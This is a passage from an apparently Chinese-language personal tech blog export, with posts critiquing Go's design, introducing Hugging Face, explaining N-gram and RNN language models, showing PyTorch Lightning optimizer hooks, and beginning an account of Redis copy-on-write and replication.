<p>Go 最大、最广为人知的优点之一，可能就是 goroutine 了。goroutine 是一种用户态线程，也叫协程，由运行时去进行 m:n 调度，即 m 个操作系统线程负责 n 个 goroutine 的执行。作为用户态线程，goroutine 的切换没有系统线程切换那么大的开销，需要陷入内核、保存状态等，而且不受操作系统线程数量的限制。goroutine 的数量可以达到成千上万，而 cpu 的线程一般只有几十个。这使得 goroutine 支持相当大的并发，非常适合后端服务器的场景。</p>
<p>在 C++ 20，Java
19 中，引入了对协程的支持，Java 中的叫虚拟线程。可惜这一块蛋糕可能已经被 G 抢完了，而且多少公司还在用 c++
11 和 java 8 呢。</p>
<h3 id="编译速度快">编译速度快</h3>
<p>相较于 C++，Go 的一个显著优点是编译速度更快，Go 的 import 支持按需导入，而且能够能够分析文件依赖，利用编译缓存加快编译速度。</p>
<h3 id="支持垃圾回收">支持垃圾回收</h3>
<p>Go 是支持垃圾回收的，有着与 Java 类似的垃圾回收机制，通过可达性分析对堆上内存进行分析回收，有时需要 stop
the
world，虽然略微影响性能，但是避免了指针乱飞的内存泄漏，还是值得的。C++ 虽然没有垃圾回收，但是有智能指针，使用得当也可以避免内存泄漏。</p>
<h2 id="缺点">缺点</h2>
<h3 id="err泛滥">err 泛滥</h3>
<p>写过 Go 代码的人可能都对 err 深恶痛绝，据说 Go 业务代码中可能有 50% 的代码都是：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>有人把这做成了一个表情包，来调侃 err 的滥用以及引起的代码冗余。当然，我也好想有一个按下 enter 就能输入这个 snippet 的键盘（狗头。</p>
<figure>
<img src="https://pic1.zhimg.com/80/v2-fc238ce2a5d51a01929fc54c8406e7bc_720w.webp?source=1940ef5c" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这种代码泛滥的原因在于，复杂业务的每一环可能都会出错的。参数校验会出错、序列化反序列化会出错、rpc 调用会出错等等，任何一个环节出错都需要终止流程。而多返回值的风格广受认可，就导致每个函数调用都需要去判错处理，使得代码复杂而冗余。</p>
<p>Go 社区对这个问题意见很大，提出了 try 的语法糖希望简化这一判断，参见 <a href="https://github.com/golang/go/issues/56165">proposal: Go 2: error
handling: try statement with handler · Issue #56165 · golang/go
(github.com)</a>，不知道能否被采纳。之前 19 年关于 try 的提案是被拒绝了。</p>
<h3 id="不支持面向对象">不支持面向对象</h3>
<p>虽然 Go 中存在接口，但是并不支持面向对象。严格意义上，Go 的风格可能更适合称为面向抽象编程，而非面向对象。Go 中只存在接口和接口的实现，没有父类、继承这些概念。Go 提倡使用组合来结合功能，并提供了匿名嵌入的方法，
使得可以便捷调用嵌入结构体的方法。这也提供了一种编程风格，但是面向对象的缺失还是使得可选的代码风格减少。</p>
<h3 id="不支持函数重载">不支持函数重载</h3>
<p>作为一门现代语言，Go 不支持重载是难以置信的。Go 有很多功能相同只是参数略有差异的函数名，例如 <code>slices.ContainsInt64,slices.ContainsString</code> 分别用于判断切片中是否存在 int64 和字符串。当然这也与 Go
1.18 之前不支持泛型有关。</p>
<h3 id="内置的slice和map">内置的 slice 和 map</h3>
<p>这也是 Go 的设计失误之一。slice、map 不由标准库提供，而是内置在语言核心。这导致了一些非常奇怪、反人类的链式反应：</p>
<ul>
<li>没有好用的容器标准库，只在语言核心提供了 slice 和 map</li>
<li> 占用 map、append、len、cap 等关键词</li>
<li>难以扩展，没有通用的接口来实现新的容器类以使得支持 range、len 等</li>
<li>不满足 duck
type，容器没有任何方法绑定，不能链式调用，必须使用额外的工具包函数层层套括号</li>
<li>给语言迭代更新增加了新的困难</li>
</ul>
<p>C++、Java，分别提供了 stl 库和 collection 抽象，实现了包括不限于动态数组、链表、队列堆栈、树等各种复杂的数据结构，大大减少了使用过程中造轮子的过程。作为面向对象的代表，Java 提供了丰富完备的容器接口，可以针对不同场景实现对应的容器，例如并发安全的容器。Python 虽然内置 list 和 dict，但也是以面向对象的方式提供，抽象了 len、iter 等接口，支持自定义容器类。</p>
<p>众所周知，Go 使用的是 duck
type，即鸭子类型：一个东西不需要说它自己是鸭子，只要看起来像鸭子，走路、叫像鸭子，它就是鸭子。这种理念下，结构体不需要显式声明实现的接口，由编译器分析是否实现了某个接口。而 Go 语言层面的 slice 和 map 却是不支持鸭子类型的，这两个类型没有方法绑定，只能依赖语言层面提供的其他关键字，例如 len、append 等完成功能。</p>
<h3 id="简陋而固执">简陋而固执</h3>
<p>简单过了头，就是简陋。<strong>Go 目前还不支持可重入锁，直到 1.18 前，不支持泛型、TryLock 等操作</strong>。难以想象这是一门现代的编程语言。Google 团队有一种自负在里面，不愿意为了用户考虑，他们的大道至简只是去简化编译器的工作，把大部分工作量留给程序员，这是很反人类的。</p>
<p>早在十几年前，Google 团队声明可重入锁是不好的设计，滋生 bug，参见 <a href="https://groups.google.com/g/golang-nuts/c/XqW1qcuZgKg/m/Ui3nQkeLV80J">groups.google.com</a>，于是直到现在 Go 仍不支持可重入锁。但是他们也承认了 TryLock 操作是最终会需要的，过了十多年的 Go1.18 版本才正式支持了 TryLock。</p>
<p>我部分理解他们的声明，他们认为可重入锁会需要额外的工作去管理 goroutine 持有的锁，相当于 goroutine 需要有 local
storage 存储这些信息，类似 Java 中的 ThreadLocal。这也是他们在避免的，于是 Go 也不支持这些，只能通过 context 层层透传，用于 goroutine 存储。</p>
<p>给人的感觉就是 Go 不像是一个产品，产品是从用户需要角度出发，采取各语言的精华，去做出一个易用、好用的产品。可重入锁的优点是很明显的，各函数可以独立工作，也可以协同工作，不需要担心死锁；不支持可重入锁就需要把每个函数写加锁和不加锁两个版本，避免调错函数死锁。他们不仅是认为实现可重入锁是不必要的，甚至拒绝相关的 PR。一他们固执地坚持着自己的观点，把握着 Go 的代码准入权，直至 2021 年的 Go
1.18 讨论上，Go 语言之父还在反对加入泛型，认为这会导致过大的工作量，而且容易出错。</p>
<p>类似的观点还有，Go 的泛型中使用了方括号，而不是尖括号。Go 的 map、slice 使用的也全部是方括号，如果一个函数有泛型、有 map、有 slice，看起来会比较费劲。他们拒绝尖括号的原因是，可能会导致歧义并且他们不愿意通过更改编译器前端解决。可以凝练为，<strong>他们不愿意去顺应用户习惯，而是强迫用户按自己的想法使用并培养习惯</strong>。这可能就是大公司的傲慢。</p>
<h3 id="不支持枚举">不支持枚举</h3>
<p>作为一个强类型语言，去除了所有的隐式转换保证代码健壮的语言，居然不支持枚举类型。枚举类型是一个不难实现且可以显著提升代码可读性的特性，迟迟不实现实属不应该。</p>
<h2 id="总结">总结</h2>
<p>从我两个多月的 Go 体验下来，感觉 Go 的优点和缺点都非常突出。Go 按 Google 团队的意志提供了一种几乎固定的编码规范，一定程度会方便标准化，但是并不是一门易用、好用、优雅的语言。</p>
<h2 id="参考">参考</h2>
<ul>
<li><p><a href="https://www.zhihu.com/question/563395289">为啥网上这么多人 diss
Golang？ - 知乎 (zhihu.com)</a></p></li>
<li><p><a href="https://www.zhihu.com/question/490457306">Go 为什么设计地这么简陋，是为了推广还是在编译器上难以实现？
- 知乎 (zhihu.com)</a></p></li>
</ul>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>NLP 必备网站 Hugging Face</title>
    <url>/blog/2021/09/27/huggingface/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来分享一个网站吧，<a href="https://huggingface.co/">Hugging
Face</a>，最大的 NLP 社区，提供了数以千计的预训练模型，涵盖一百余种语言、覆盖几乎所有常见的 NLP 任务。其提供的 transformers 框架提供了简洁高效的 api，可以在无需处理模型细节的前提下，快速进行推理、微调。Hugging
Face 至今在 github 上已有超过 5 万个 star，可见其影响力。</p>
<span id="more"></span>
<h2 id="为什么需要hugging-face">为什么需要 Hugging Face</h2>
<p><img src="intro.png"></p>
<p>Hugging
Face 不仅仅是若干数据集、预训练模型的资源整合，在此基础上，它还拥有如下特性：</p>
<ul>
<li>开箱即用：对于常见的 NLP 任务，很容易找到对应的预训练模型并进行实验，无需过度关注模型的细节。</li>
<li>多后端支持：Transformers 支持 Pytorch、Jax、Tensorflow 三种框架，无需再为框架微调苦恼。</li>
<li>可定制性：高效封装的同时，Transformers 支持魔改定制模型，模型文件可以单独使用，方便快速实验。</li>
</ul>
<p>鉴于现在 NLP 方向的研究、工程基本都是大规模预训练模型相关，Hugging
Face 的重要性就一目了然了。如果你是学生党，Hugging
Face 能让你在各类 NLP 比赛中快速使用预训练模型进行实验。如果你已经工作，Hugging
Face 也能帮你减少业务问题上的试错成本，快速把任务跑起来。</p>
<h2 id="有用的链接">有用的链接</h2>
<ol type="1">
<li><a href="https://github.com/huggingface/transformers">github 链接</a>，可以对其使用方法、支持的模型有个快速的认识。</li>
<li><a href="https://huggingface.co/">Hugging Face
官网</a>，试试推理 api、看一看文档。</li>
<li><a href="https://huggingface.co/course/chapter0?fw=pt">Hugging Face
Course</a>，Hugging
Face 出品的官方课程，目前更新了前四章，基本上是 step-by-step 的教你从推理到微调任务如何构建和完成。</li>
</ol>
<h2 id="总结">总结</h2>
<p>没错，这么短的一篇博客还有总结。今天刚刚看完 Hugging Face
的前四章课程，感觉学到了很多。早点知道也不会走一些弯路了，一起加油吧！</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>Hugging Face</tag>
        <tag>工程</tag>
      </tags>
  </entry>
  <entry>
    <title>语言模型</title>
    <url>/blog/2021/07/22/language-model/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>语言模型是自然语言处理的一个重要部分，在很多生成式任务中，都离不开语言模型。今天我想梳理一下我所理解的语言模型及其发展。</p>
<span id="more"></span>
<h2 id="定义">定义</h2>
<p>对于一串语言序列<span class="math inline"> \(w_1w_2\dots
w_n\)</span>，语言模型试图分析其出现的概率，即<span class="math inline"> \(P(w_1,w_2,\dots,w_n)\)</span>​​​​。进而，可以通过概率大小判断文本是否合理。例如句子 “学生们打开了书” 的概率应该比 “学生们打开了玛卡巴卡” 高得多，即更像是人说的话。</p>
<p>在之前的 VQ-VAE 中，我们提到过自回归模型，按照自回归的思路，如果第 n 个单词只与前 n-1 个单词相关，那么句子的概率可以转化为如下形式：
<span class="math display">\[
P(w_1,w_2,\dots,w_n)=\prod_t^nP(w_t|w_{t-1:1})
\]</span> 那么怎么求解右侧的式子呢？</p>
<h2 id="n-gram">N-gram</h2>
<p>首先要提到的是 N-gram 模型。为了解决上面这个问题，N-gram 模型引入了马尔科夫假设，认为某一个词只与它之前的<span class="math inline"> \(N-1\)</span> 个词有关。以 4-gram 为例，即每个词只与其之前的 3 个词有关，即：
<span class="math display">\[
P(w_n|w_{n-1:1})=P(w_n|w_{n-1},w_{n-2},w_{n-3})
\]</span>
换而言之，只要在大规模语料中进行频数的统计，那么就可以得到上述概率的估计：
<span class="math display">\[
P(w_n|w_{n-1},w_{n-2},w_{n-3})=\frac{C(w_n,w_{n-1},w_{n-2},w_{n-3})}{C(w_{n-1},w_{n-2},w_{n-3})}
\]</span> 进而整个句子的概率可以计算如下： <span class="math display">\[
P(w_1,w_2,\dots,w_n)=\prod_t^nP(w_t|w_{t-1},w_{t-2},w_{t-3})
\]</span> 上述的方法虽然简单直接，但是有以下缺点：</p>
<ul>
<li>稀疏问题：一些片段可能没有在语料中出现，计数为 0，在概率连乘之下整句概率变为 0。</li>
<li>存储问题：随着 n 的增大，存储量指数级上升，而 n 过小时模型性能又会很差。</li>
</ul>
<h2 id="基于窗口的神经网络">基于窗口的神经网络</h2>
<p>在 N-gram 的基础上，使用神经网络来计算条件概率。同样以 4-gram 为例，计算用公式表达如下:
<span class="math display">\[
\begin{align}
P(w_n|w_{n-1:1})&amp;=P(w_n|w_{n-1},w_{n-2},w_{n-3})\\
&amp;=softmax(W[w_{n-1};w_{n-2};w_{n-3}])
\end{align}
\]</span>
思路非常简单，即将前 N-1 个词输入到神经网络，由神经网络计算得到第 N 个词的概率分布。这样做解决了 N-gram 的稀疏问题与存储问题，但也存在一些问题：</p>
<ul>
<li>缺少参数共享：以上述公式为例，<span class="math inline">\(W\)</span>​​​中可以分为三部分，分别处理前三个词。然而，词向量的处理逻辑应该是相似的（因为他们都是同样的方法训练出来的）。</li>
<li>需要变化窗口大小时，矩阵 W 的形状也需要变化，进而需要重新训练。</li>
</ul>
<h2 id="循环神经网络rnn">循环神经网络 RNN</h2>
<p>RNN 的思路同样也很直接，使用同一个矩阵<span class="math inline"> \(W\)</span> 来处理词向量，并使用一个隐藏状态来记录已处理的信息（换而言之，就无需马尔科夫假设）。RNN 的公式如下:
<span class="math display">\[
h_t=\sigma(W^{(hh)}h_{t-1}+W^{(hx)}x_t)
\]</span></p>
<p><span class="math display">\[
\hat{y_t}=softmax(W^{(S)}h_t)
\]</span></p>
<p>其中，<span class="math inline">\(\sigma\)</span> 是激活函数，<span class="math inline">\(h_t\)</span> 是 t 时刻的隐藏状态，<span class="math inline">\(W\)</span> 是参数矩阵。</p>
<p>RNN 有以下优点：</p>
<ul>
<li>能够处理任意长度的序列。</li>
<li>没有进行马尔科夫假设，理论上每一时刻模型都知道之前时刻的全部信息。</li>
</ul>
<p>但也有以下缺点：</p>
<ul>
<li>会出现梯度消失和梯度爆炸问题。</li>
<li>不支持并行化，计算较慢。（可以说是自回归模型的通病）</li>
</ul>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/63397627">CS224N 笔记 (六)：语言模型与 RNN
- 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>语言模型</category>
      </categories>
      <tags>
        <tag>语言模型</tag>
      </tags>
  </entry>
  <entry>
    <title>PyTorch Lightning: 让 PyTorch 更为易用</title>
    <url>/blog/2022/08/11/pytorch-lightning/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>今天来介绍一个很好用的深度学习框架，PyTorch
Lightning。从名字就可以看出，它是基于 PyTorch 的框架。它的核心思想是，将学术代码（模型定义、前向 / 反向、优化器、验证等）与工程代码（for-loop，保存、tensorboard 日志、训练策略等）解耦开来，使得代码更为简洁清晰。工程代码经常会出现在深度学习代码中，PyTorch
Lightning 对这部分逻辑进行了封装，只需要在 Trainer 类中简单设置即可调用，无需重复造轮子。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>近些年来，各种深度学习框架层出不穷，TensorFlow、PyTorch 已经成为深度学习研究人员使用最多的两个框架。其中，PyTorch 的热度连年飙升，大有超越 TensorFlow 之势。
基础的张量运算、计算图等功能已经被这些框架支持的很好了，后面的框架开始着力于解决其他问题，例如：</p>
<ul>
<li>transformers:
致力于简单高效地使用预训练模型，支持 PyTorch 和 TensorFlow 作为后端</li>
<li> Fairseq：提供通用建模序列任务的工具包，包含丰富高效的命令行接口，基于 PyTorch</li>
<li>Pytorch
Lightning：解决深度学习代码中，学术代码、工程代码耦合性高，工程代码需要重复造轮子等问题</li>
</ul>
<p>我之前已经介绍过 transformers 了，相信做 NLP 的同学都对这个框架很熟悉了。Fairseq 我也接触过一段时间，但是由于其文档不是很详细，大部分问题都要读源码才能找到答案，
入门起来比较痛苦。Pytorch
Lightning 就是本文的重点了，下面做详细介绍。</p>
<h2 id="一个例子">一个例子</h2>
<p>引用一个官网的 gif，介绍 Pytorch
Lightning 的动机是什么。一段典型的、基于 PyTorch 的深度学习代码可能是下面左侧的这样的，
包含：模型、优化器、数据定义，训练、验证循环逻辑。</p>
<p><img src="pl_quick_start_full_compressed.gif"></p>
<p>可以将其转化为右侧的 Lightning Module，按照以下步骤：</p>
<ul>
<li>将模型定义代码写在<code>__init__</code>中</li>
<li>定义前向传播逻辑</li>
<li>将优化器代码写在 <code>configure_optimizers</code> 钩子中</li>
<li>训练代码写在 <code>training_step</code> 钩子中，可以使用 <code>self.log</code> 随时记录变量的值，会保存在 tensorboard 中</li>
<li>验证代码写在 <code>validation_step</code> 钩子中</li>
<li>移除硬件调用<code>.cuda()</code> 等，PyTorch
Lightning 会自动将模型、张量的设备放置在合适的设备；移除<code>.train()</code> 等代码，这也会自动切换</li>
<li>根据需要，重写其他钩子函数，例如 <code>validation_epoch_end</code>，对 <code>validation_step</code> 的结果进行汇总；<code>train_dataloader</code>，定义训练数据的加载逻辑</li>
<li>实例化 Lightning Module 和 Trainer 对象，传入数据集</li>
<li>定义训练参数和回调函数，例如训练设备、数量、保存策略，Early
Stop、半精度等</li>
</ul>
<p>其中，最为直接的好处是，你无需关注模型和张量的设备，可以省去不计其数的<code>.cuda()</code>，再也不需要担心 device 报错了（当然，自己新建的张量还是需要调整下设备的）。
此外就是功能强大的 Trainer 和 tensorboard 的集成，可以非常优雅地调用。</p>
<h2 id="进阶">进阶</h2>
<p>如果想要解锁 PyTorch Lightning 的更多玩法，可以参考<a href="%5BBasic%20skills%20—%20PyTorch%20Lightning%201.8.0dev%20documentation%20(pytorch-lightning.readthedocs.io)%5D(https://pytorch-lightning.readthedocs.io/en/latest/levels/core_skills.html)">官方文档</a>，详细地介绍了各种技巧，辅以代码示例，很容易理解上手。对于核心的 API，Lightning
Module 的各种钩子，Trainer 的参数、用法，也做了详细的介绍。文档中还包含各种常见的工作流、上手教程，内容非常的齐全。</p>
<p>例如，<code>configure_optimizers</code> 支持配置多个优化器、搭配学习率衰减策略。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># most cases. no learning rate scheduler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> Adam(self.parameters(), lr=<span class="number">1e-3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiple optimizer case (e.g.: GAN)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    <span class="keyword">return</span> gen_opt, dis_opt</span><br><span class="line"></span><br><span class="line"><span class="comment"># example with learning rate schedulers</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    dis_sch = CosineAnnealing(dis_opt, T_max=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> [gen_opt, dis_opt], [dis_sch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># example with step-based learning rate schedulers</span></span><br><span class="line"><span class="comment"># each optimizer has its own scheduler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    gen_sch = {</span><br><span class="line">        <span class="string">'scheduler'</span>: ExponentialLR(gen_opt, <span class="number">0.99</span>),</span><br><span class="line">        <span class="string">'interval'</span>: <span class="string">'step'</span>  <span class="comment"># called after each training step</span></span><br><span class="line">    }</span><br><span class="line">    dis_sch = CosineAnnealing(dis_opt, T_max=<span class="number">10</span>) <span class="comment"># called every epoch</span></span><br><span class="line">    <span class="keyword">return</span> [gen_opt, dis_opt], [gen_sch, dis_sch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># example with optimizer frequencies</span></span><br><span class="line"><span class="comment"># see training procedure in `Improved Training of Wasserstein GANs`, Algorithm 1</span></span><br><span class="line"><span class="comment"># https://arxiv.org/abs/1704.00028</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure_optimizers</span>(<span class="params">self</span>):</span></span><br><span class="line">    gen_opt = Adam(self.model_gen.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line">    dis_opt = Adam(self.model_dis.parameters(), lr=<span class="number">0.02</span>)</span><br><span class="line">    n_critic = <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        {<span class="string">'optimizer'</span>: dis_opt, <span class="string">'frequency'</span>: n_critic},</span><br><span class="line">        {<span class="string">'optimizer'</span>: gen_opt, <span class="string">'frequency'</span>: <span class="number">1</span>}</span><br><span class="line">    )</span><br></pre></td></tr></tbody></table></figure>
<p>可以在，<code>epoch_end</code> 系列的钩子中，完成 Epoch-level 的 metric 计算。以 <code>validation_epoch_end</code> 为例，其接收一个参数 <code>validation_step_outputs</code>，是一个 list，包含了 <code>validation_step</code> 的所有返回结果。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation_step</span>(<span class="params">self, batch, batch_idx</span>):</span></span><br><span class="line">    x, y = batch</span><br><span class="line">    y_hat = self.model(x)</span><br><span class="line">    loss = F.cross_entropy(y_hat, y)</span><br><span class="line">    pred = ...</span><br><span class="line">    <span class="keyword">return</span> pred</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation_epoch_end</span>(<span class="params">self, validation_step_outputs</span>):</span></span><br><span class="line">    all_preds = torch.stack(validation_step_outputs)</span><br><span class="line">    ...</span><br></pre></td></tr></tbody></table></figure>
<p>Trainer 中，常见的回调函数有 <code>ModelCheckpoint</code>，完成模型的定期保存；<code>EarlyStopping</code>，定义模型的早停策略。Trainer 定义时，只需要传入 <code>precision=16</code>，即可实现 PyTorch
naive 的混合半精度，如果要制定 apex 后端，也只需要加上一行 <code>amp_backend='apex'</code> 即可。使用 <code>accelerator</code> 可以方便切换各种加速设备，CPU、GPU、TPU、IPU 等等。指定 <code>strategy="ddp"</code> 即可使用数据并行策略。</p>
<p>过多的就不再赘述了，官方文档介绍的还挺详细的，按需引入即可。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://pytorch-lightning.readthedocs.io/en/latest/starter/introduction.html">Lightning
in 15 minutes — PyTorch Lightning 1.8.0dev documentation
(pytorch-lightning.readthedocs.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>代码</tag>
        <tag>框架</tag>
        <tag>PyTorch</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 集群模式</title>
    <url>/blog/2023/02/15/redis-cluster/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇文章主要梳理一下 Redis 的集群模式，明白它是如何做到高可用、支持高并发的。</p>
<span id="more"></span>
<h2 id="copy-on-write">Copy On Write</h2>
<p>首先要了解一下 copy on
write 机制，才能理解 Redis 做备份时如何保持一致。copy on
write（简写为 cow），中文名为写时复制，是计算机领域非常经典的优化思想。可以先从 linux 的 fork 函数了解下 cow 的原理。已经理解这部分知识的读者可以直接跳到下一章节。</p>
<p>fork 是 unix 系统上用于创建进程的函数，例如下面的 C 代码，调用 fork 后，会创建一个新的进程，从 fork 处接着向后执行。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&nbsp;<span class="meta-string">&lt;unistd.h&gt;</span>&nbsp;&nbsp;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&nbsp;<span class="meta-string">&lt;stdio.h&gt;</span>&nbsp;&nbsp;</span></span><br><span class="line">&nbsp;</span><br><span class="line"><span class="function"><span class="keyword">int</span>&nbsp;<span class="title">main</span>&nbsp;<span class="params">()</span>&nbsp;&nbsp;&nbsp;</span></span><br><span class="line"><span class="function"></span>{&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">pid_t</span>&nbsp;fpid;&nbsp;<span class="comment">//fpid表示fork函数返回的值&nbsp;&nbsp;</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">int</span>&nbsp;count=<span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 调用fork，创建出子进程&nbsp;&nbsp;</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;fpid=fork();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 所以下面的代码有两个进程执行！</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span>&nbsp;(fpid&nbsp;&lt;&nbsp;<span class="number">0</span>)&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"创建进程失败!/n"</span>);&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span>&nbsp;<span class="keyword">if</span>&nbsp;(fpid&nbsp;==&nbsp;<span class="number">0</span>)&nbsp;{&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"我是子进程，由父进程fork出来/n"</span>);&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count++;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span>&nbsp;{&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"我是父进程/n"</span>);&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count++;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"统计结果是:&nbsp;%d/n"</span>,count);&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span>&nbsp;<span class="number">0</span>;&nbsp;&nbsp;</span><br><span class="line">}&nbsp;&nbsp;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>fork 函数的特点是，它会在父子进程各返回一次，<strong>将子进程的 pid（进程 id）返回给父进程，将 0 返回给子进程</strong>，因此可以通过 pid 判断当前进程是父进程还是子进程。上述代码的结果是</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">我是子进程，由父进程fork出来</span><br><span class="line"></span><br><span class="line">统计结果是: 1</span><br><span class="line"></span><br><span class="line">我是父进程</span><br><span class="line"></span><br><span class="line">统计结果是: 1</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>在 fork 之后，出现了一个与父进程的副本，从相同的位置向后执行。副本意味着从操作系统的角度，父子进程的地址空间是相同的（除了 fork 返回值），这样两个进程才能共享 fork 前的状态，同样地向后执行。如何实现这个副本呢？一种简单的想法是，直接申请相同大小的物理页，逐页面地拷贝数据，再更新页表即可。这样就可以<strong>保证两个进程的初始状态相同，且后续的修改不相互影响</strong>。如上所示，<code>count</code> 的值在每个进程中都是 1，而不是 2。</p>
<p>但是这样做的开销是非常大的，子进程可能只需要对很少的变量进行修改，拷贝整个地址空间显得既多余又严重影响速度，启动时间非常长。copy
on
write 就可以完美解决这个问题。在这种思想下，<strong>在 fork 后，两个进程是共享地址空间的，并把所有页面标记为 READ_ONLY，即只可读不可写，也就是 fork 只是把父进程的页表做了一次拷贝，非常快</strong>。当父 / 子进程需要对地址进行修改时：</p>
<ol type="1">
<li>发现页面不可修改，触发<strong>页异常中断 page-fault</strong>，申请新的页面，将旧页面数据拷贝至新页面</li>
<li>在新页面做修改，并更改页表映射关系</li>
</ol>
<p>这也就是 copy on
write 名字的由来，在需要修改（写入）的时候，对页面进行复制。这样<strong>既达到了非常快的启动时间，也实现了按需申请资源</strong>。当然缺点也是有的，如果父 / 子进程需要修改大量的数据，反复的异常中断也会影响性能。</p>
<h2 id="复制与分片">复制与分片</h2>
<p>数据库的集群模式中，按思想可分为复制和分片两类，这对 MySQL、Redis 都适用。这里先介绍下这两种思想，方便后续理解。需要注意的是，这两种方法应用于 MySQL 时都会有一致性的问题。</p>
<h3 id="复制">复制</h3>
<p>在复制的概念中，数据库分为两类，一类是主数据库（master），另一类是从数据库（slave）。主数据库可以进行读写操作，当<strong>写操作导致数据变化时会自动将数据同步给从数据库</strong>。而<strong>从数据库一般是只读的</strong>，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。</p>
<p>引入复制的目的主要有：</p>
<ul>
<li>读取高效：读取的吞吐量成倍提升，选择延迟更低的节点</li>
<li>多点备份，容灾恢复</li>
</ul>
<p>复制的缺点也很明显，会有一致性的问题：写操作无法及时同步到主节点，导致读取数据不一致，对于 MySQL 这种需要保证一致性的数据库问题尤为严重。</p>
<p>复制的过程中需要同步写操作：</p>
<ul>
<li>对于新启动的节点，最省事的方法当然是把整个数据库文件传过去</li>
<li>对于运行中的节点，只需要同步本次写的操作即可，MySQL 可以使用 binlog，Redis 可以使用 aof 日志</li>
</ul>
